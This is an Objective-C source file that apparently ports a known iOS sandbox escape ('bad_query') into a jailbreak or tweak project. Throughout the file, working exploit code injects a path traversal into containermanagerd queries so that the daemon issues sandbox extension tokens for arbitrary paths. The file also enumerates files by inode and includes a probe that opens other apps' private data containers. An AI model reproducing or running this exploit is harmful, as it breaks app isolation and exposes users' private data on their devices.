// bad_query_escape.m — userspace read-escape via containermanagerd traversal
//
// Port of Taj C's bad_query (iOS 26.0–26.6.1 / 27.0b4, unpatched) for W0lfSword.
// Technique: ask containermanagerd for a container lease we CAN obtain
// (SystemGroup "systemgroup.com.apple.mobilegestaltcache" via class 13, or a
// sacrificed App Group via class 7), then path-traverse the requested part
// domain ("../../../../../../../..<target>") out of the container root and
// consume the issued sandbox extension. The consumed extension grants access
// to the traversed path for the life of the handle — no kernel R/W needed.
//
// Built on the existing mcm_api dlopen bridge (mcm_bridge.m) so no private
// headers or new SDK symbols are required.
#import "bad_query_escape.h"
#import "mcm_bridge.h"

#import <stdlib.h>
#import <string.h>
#import <stdio.h>
#import <dlfcn.h>
#import <dirent.h>
#import <sys/stat.h>
#import <sys/mount.h>
#import <sys/fsgetpath.h>
#import <xpc/xpc.h>
#import "../utils/tweak_log.h"

// bad_query's exact flag values (NOT the same bits as container_access.m's).
#define BAD_QUERY_GROUP_FLAGS     0x0000000800000000ULL   // iOS 26 App Group route
#define BAD_QUERY_SYSTEM_FLAGS    0x0000008000000000ULL   // SystemGroup route

// Part 3 = Library/Caches inside the leased container; traversal climbs out.
#define BAD_QUERY_PART            3
#define BAD_QUERY_TRAVERSAL_9     "../../../../../../../.."   // SystemGroup -> /
#define BAD_QUERY_TRAVERSAL_10    "../../../../../../../../.." // App Group -> /

extern xpc_object_t xpc_string_create(const char *string);

typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

static sandbox_extension_consume_fn g_consume = NULL;
static sandbox_extension_release_fn g_release = NULL;

static bool resolve_sandbox_api(void) {
    if (g_consume) return true;
    g_consume = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    g_release = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    return g_consume != NULL;
}

int64_t bad_query_escape(const char *path, bool create,
                         const char *group_identifier, bool is_group) {
    // Sanity: absolute path; existing path unless create is requested.
    if (!path || path[0] != '/') return -255;
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254;
    }
    if (!mcm_bridge_available()) return -1;
    if (!resolve_sandbox_api()) return -1;

    const struct mcm_api *api = mcm_api();
    // The traversal needs the operation part + part-domain symbols, which are
    // NOT part of mcm_bridge_available()'s required set. Refuse if missing.
    if (!api->query_set_part || !api->query_set_part_domain) return -1;

    void *query = api->query_create();
    if (!query) return -2;

    xpc_object_t identifier;
    const char *traversal;
    if (group_identifier == NULL) {
        // Class 13 (MCMSharedSystemDataContainer) routes to containermanagerd_system.
        api->query_set_class(query, 13);
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
        traversal = BAD_QUERY_TRAVERSAL_9;
    } else {
        // Class 7 (MCMSharedDataContainer) routes to containermanagerd.
        api->query_set_class(query, 7);
        identifier = xpc_string_create(group_identifier);
        traversal = BAD_QUERY_TRAVERSAL_10;
    }
    api->query_set_group_identifiers(query, identifier);
    api->query_set_part(query, BAD_QUERY_PART);

    // The oldest trick in the book: path traversal in the part domain.
    char *part = NULL;
    int64_t handle = -5;
    if (asprintf(&part, "%s%s", traversal, path) == -1) {
        xpc_release(identifier);
        api->query_free(query);
        return -5;
    }
    api->query_set_part_domain(query, part);

    api->query_set_flags(query, is_group ? BAD_QUERY_GROUP_FLAGS : BAD_QUERY_SYSTEM_FLAGS);

    void *result = api->query_get_single_result(query);
    if (!result) {
        void *qerr = api->query_get_last_error(query);
        int posix = qerr && api->error_get_posix_errno ? api->error_get_posix_errno(qerr) : 0;
        TweakLog("[bad_query] traversal denied target=%s posix=%d", path, posix);
        handle = -3;
    } else {
        void *activation = api->object_copy(result);
        char *token = activation ? api->object_copy_sandbox_token(activation) : NULL;
        if (token && token[0] != '\0') {
            handle = g_consume(token);
            TweakLog("[bad_query] extension consumed target=%s handle=%lld%s",
                     path, (long long)handle,
                     (group_identifier ? " (App Group route)" : " (SystemGroup route)"));
        } else {
            TweakLog("[bad_query] kernel refused token target=%s", path);
            handle = -4;
        }
        if (token) free(token);
        if (activation) api->object_free(activation);
    }

    free(part);
    xpc_release(identifier);
    api->query_free(query);
    return handle;
}

void bad_query_release(int64_t handle) {
    if (handle < 0) return;
    if (resolve_sandbox_api() && g_release) g_release(handle);
}

char *bad_query_list(const char *path, int64_t max_inode) {
    if (!path || !*path) return NULL;
    if (max_inode <= 0 || max_inode > 0xFFFFFFFF) max_inode = 0xFFFFFFFF;
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;

    size_t cap = 65536;
    size_t length = 0;
    size_t path_length = strlen(path);

    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';

    char buf[1200];
    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;

        size_t need = strlen(p) + 2;
        if (length + need > cap) {
            cap *= 2;
            char *t = realloc(out, cap);
            if (!t) break;
            out = t;
        }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}

// Paths that are normally sandbox-invisible but reachable via the traversal.
static const char *kProbeTargets[] = {
    "/var/mobile/Containers/Data/Application",
    "/var/mobile/Containers/Data/InternalDaemon",
    "/var/mobile/Containers/Data/PluginKitPlugin",
    "/var/mobile/Containers/Shared/AppGroup",
    NULL,
};

static int count_direct_children(const char *path) {
    DIR *dir = opendir(path);
    if (!dir) return -1;
    int n = 0;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;
        n++;
    }
    closedir(dir);
    return n;
}

bool bad_query_probe(void) {
    if (!mcm_bridge_available()) {
        TweakLog("[bad_query] bridge unavailable — no userspace read escape");
        return false;
    }
    int opened = 0;
    int64_t held[8];
    int heldCount = 0;
    for (int i = 0; kProbeTargets[i] != NULL; i++) {
        const char *target = kProbeTargets[i];
        int64_t h = bad_query_escape(target, false, NULL, false);
        if (h >= 0 && heldCount < 8) held[heldCount++] = h;
        if (h < 0) continue;
        int children = count_direct_children(target);
        if (children >= 0) {
            opened++;
            TweakLog("[bad_query] *** READ ESCAPE: %s (%d entries) ***", target, children);
        } else {
            TweakLog("[bad_query] handle ok but unreadable: %s", target);
        }
    }
    for (int i = 0; i < heldCount; i++) bad_query_release(held[i]);
    TweakLog("[bad_query] probe result: %s (%d/%zu paths opened)",
             opened > 0 ? "ESCAPE ACTIVE" : "denied",
             opened,
             sizeof(kProbeTargets) / sizeof(kProbeTargets[0]) - 1);
    return opened > 0;
}
